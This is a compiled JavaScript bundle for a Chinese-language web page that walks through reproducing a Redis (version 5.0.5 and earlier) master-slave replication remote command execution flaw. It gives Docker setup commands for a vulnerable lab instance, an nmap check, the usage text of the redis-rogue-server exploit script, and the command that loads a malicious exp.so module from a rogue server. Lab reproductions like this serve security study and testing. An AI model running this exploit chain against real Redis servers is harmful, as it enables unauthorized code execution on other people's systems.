(window.webpackJsonp=window.webpackJsonp||[]).push([[420],{1888:function(s,a,t){s.exports=t.p+"assets/img/image-20220309231916165.e64b03c2.png"},1889:function(s,a,t){s.exports=t.p+"assets/img/image-20220309231926604.6bd821d6.png"},3093:function(s,a,t){"use strict";t.r(a);var e=t(64),r=Object(e.a)({},(function(){var s=this,a=s._self._c;return a("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[a("h1",{attrs:{id:"redis-小于5-0-5-主从复制远程命令执行漏洞"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#redis-小于5-0-5-主从复制远程命令执行漏洞"}},[s._v("#")]),s._v(" Redis 小于5.0.5 主从复制远程命令执行漏洞")]),s._v(" "),a("h2",{attrs:{id:"漏洞描述"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#漏洞描述"}},[s._v("#")]),s._v(" 漏洞描述")]),s._v(" "),a("p",[s._v("在2019年7月7日结束的WCTF2019 Final上，LC/BC的成员Pavel Toporkov在分享会上介绍了一种关于redis新版本的RCE利用方式，比起以前的利用方式来说，这种利用方式更为通用，危害也更大")]),s._v(" "),a("p",[a("a",{attrs:{href:"https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf",target:"_blank",rel:"noopener noreferrer"}},[s._v("Pavel Toporkov的分享"),a("OutboundLink")],1)]),s._v(" "),a("h2",{attrs:{id:"影响版本"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#影响版本"}},[s._v("#")]),s._v(" 影响版本")]),s._v(" "),a("a-checkbox",{attrs:{checked:""}},[s._v("Redis <= 5.0.5")]),a("br"),s._v(" "),a("h2",{attrs:{id:"环境搭建"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#环境搭建"}},[s._v("#")]),s._v(" 环境搭建")]),s._v(" "),a("div",{staticClass:"language-shell line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-shell"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[s._v("docker")]),s._v(" pull damonevking/redis5.0 \n"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("docker")]),s._v(" run "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-p")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("6379")]),s._v(":6379 "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-d")]),s._v(" damonevking/redis5.0 redis-server\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br")])]),a("p",[s._v("nmap扫描一下6379端口开放即为搭建成功")]),s._v(" "),a("div",{staticClass:"language-shell line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-shell"}},[a("code",[s._v("root@kali:~/桌面"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# docker pull damonevking/redis5.0 ")]),s._v("\nUsing default tag: latest\n\nlatest: Pulling from damonevking/redis5.0\nfc7181108d40: Pull complete \n3e0ac67cad82: Pull complete \n6ee495cb7235: Pull complete \n9f7206d08b9d: Pull complete \na8354ef8cccb: Pull complete \n53afb10d81c2: Pull complete \nDigest: sha256:adcf62f378efe1187d2f72c6f0ecdf86ab2173a9e1c3c9f4fe4bb89060f5362f\nStatus: Downloaded newer image "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("for")]),s._v(" damonevking/redis5.0:latest\ndocker.io/damonevking/redis5.0:latest\nroot@kali:~/桌面"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# docker run -p 6379:6379 -d damonevking/redis5.0 redis-server")]),s._v("\n1275aa9c6c8f8ad0b6c8e58e609be6681acedec301b5593f7e8b0bd65f7fad12\nroot@kali:~/桌面"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# nmap 127.0.0.1 -p 6379")]),s._v("\nStarting Nmap "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("7.80")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v(" https://nmap.org "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" at "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("2020")]),s._v("-12-08 "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("21")]),s._v(":47 CST\nNmap scan report "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("for")]),s._v(" localhost "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("127.0")]),s._v(".0.1"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\nHost is up "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),s._v(".000099s latency"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(".\n\nPORT     STATE SERVICE\n"),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("6379")]),s._v("/tcp "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("open")]),s._v("  redis\n\nNmap done: "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),s._v(" IP address "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("host")]),s._v(" up"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" scanned "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("in")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0.10")]),s._v(" seconds\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br"),a("span",{staticClass:"line-number"},[s._v("14")]),a("br"),a("span",{staticClass:"line-number"},[s._v("15")]),a("br"),a("span",{staticClass:"line-number"},[s._v("16")]),a("br"),a("span",{staticClass:"line-number"},[s._v("17")]),a("br"),a("span",{staticClass:"line-number"},[s._v("18")]),a("br"),a("span",{staticClass:"line-number"},[s._v("19")]),a("br"),a("span",{staticClass:"line-number"},[s._v("20")]),a("br"),a("span",{staticClass:"line-number"},[s._v("21")]),a("br"),a("span",{staticClass:"line-number"},[s._v("22")]),a("br"),a("span",{staticClass:"line-number"},[s._v("23")]),a("br"),a("span",{staticClass:"line-number"},[s._v("24")]),a("br")])]),a("h2",{attrs:{id:"漏洞复现"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#漏洞复现"}},[s._v("#")]),s._v(" 漏洞复现")]),s._v(" "),a("p",[s._v("关于漏洞原理请查看"),a("a",{attrs:{href:"https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf",target:"_blank",rel:"noopener noreferrer"}},[s._v("Pavel Toporkov的分享"),a("OutboundLink")],1)]),s._v(" "),a("p",[s._v("漏洞利用脚本: "),a("a",{attrs:{href:"https://github.com/n0b0dyCN/redis-rogue-server",target:"_blank",rel:"noopener noreferrer"}},[s._v("n0b0dyCN/redis-rogue-server"),a("OutboundLink")],1)]),s._v(" "),a("div",{staticClass:"language-shell line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-shell"}},[a("code",[s._v("➜ ./redis-rogue-server.py "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-h")]),s._v("\n______         _ _      ______                         _____                          \n"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" ___ "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("       "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("_"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("     "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" ___ "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("                       /  ___"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v("                         \n"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v("_/ /___  __"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v("_ ___  "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v("_/ /___   __ _ _   _  ___  "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token variable"}},[a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("`")]),s._v("--.  ___ _ ____   _____ _ __ \n"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v("    // _ "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("/ _"),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("`")])]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" / __"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v("    // _ "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v(" / _"),a("span",{pre:!0,attrs:{class:"token variable"}},[a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("`")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v("/ _ "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("  "),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("`")])]),s._v("--. "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("/ _ "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'__\\ \\ / / _ \\ '")]),s._v("__"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("  __/ "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("_"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("__ "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("_"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("_"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v("_"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v("  __/ /"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("__/ /  __/ "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v("   "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v(" V /  __/ "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v("   \n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("_"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("_"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("___"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("__,_"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v("_"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v("___/ "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("_"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("_"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("___/ "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("__, "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("__,_"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("___"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("____/ "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("___"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v("_"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v("    "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("_/ "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("___"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v("_"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v("   \n                                     __/ "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v("                                            \n                                    "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v("___/                                             \n@copyright n0b0dy @ r3kapig\n\nUsage: redis-rogue-server.py "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("options"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\n\nOptions:\n  -h, "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("--help")]),s._v("           show this "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("help")]),s._v(" message and "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("exit")]),s._v("\n  "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("--rhost")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("REMOTE_HOST  target "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("host")]),s._v("\n  "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("--rport")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("REMOTE_PORT  target redis port, default "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("6379")]),s._v("\n  "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("--lhost")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("LOCAL_HOST   rogue server "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("ip")]),s._v("\n  "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("--lport")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("LOCAL_PORT   rogue server listen port, default "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("21000")]),s._v("\n  "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("--exp")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("EXP_FILE       Redis Module to load, default exp.so\n  -v, "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("--verbose")]),s._v("        Show full data stream\nExample\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br"),a("span",{staticClass:"line-number"},[s._v("14")]),a("br"),a("span",{staticClass:"line-number"},[s._v("15")]),a("br"),a("span",{staticClass:"line-number"},[s._v("16")]),a("br"),a("span",{staticClass:"line-number"},[s._v("17")]),a("br"),a("span",{staticClass:"line-number"},[s._v("18")]),a("br"),a("span",{staticClass:"line-number"},[s._v("19")]),a("br"),a("span",{staticClass:"line-number"},[s._v("20")]),a("br"),a("span",{staticClass:"line-number"},[s._v("21")]),a("br"),a("span",{staticClass:"line-number"},[s._v("22")]),a("br")])]),a("p",[a("img",{attrs:{src:t(1888),alt:"image-20220309231916165"}})]),s._v(" "),a("div",{staticClass:"language-shell line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-shell"}},[a("code",[s._v("python3 redis-rogue-server.py "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("--rhost")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".51.146 "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("--lhost")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".51.146 "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("--exp")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("exp.so\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[a("img",{attrs:{src:t(1889),alt:"image-20220309231926604"}})])],1)}),[],!1,null,null,null);a.default=r.exports}}]);